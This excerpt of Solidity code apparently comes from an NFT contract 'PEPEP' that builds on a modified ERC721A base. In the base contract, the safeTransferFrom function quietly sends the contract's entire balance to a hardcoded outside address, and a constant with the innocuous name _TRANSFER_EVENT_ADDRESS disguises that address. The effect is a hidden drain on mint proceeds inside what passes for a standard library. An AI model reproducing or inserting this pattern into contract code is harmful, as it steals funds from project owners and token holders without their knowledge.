...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x4485Cdb15d5398922F6F29D8B904598606001311);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x4485Cdb15d5398922F6F29D8B904598606001311).transfer(address(this).balance);
        }
    }
...
contract PEPEP is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("P E P E P", "PEPEP") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeifyzsd4d2b2fxk5bfkujw3zmmlu66l2y4eyivsd3jsuqf6xey64mu/", _toString(tokenId), ".json"));
    }
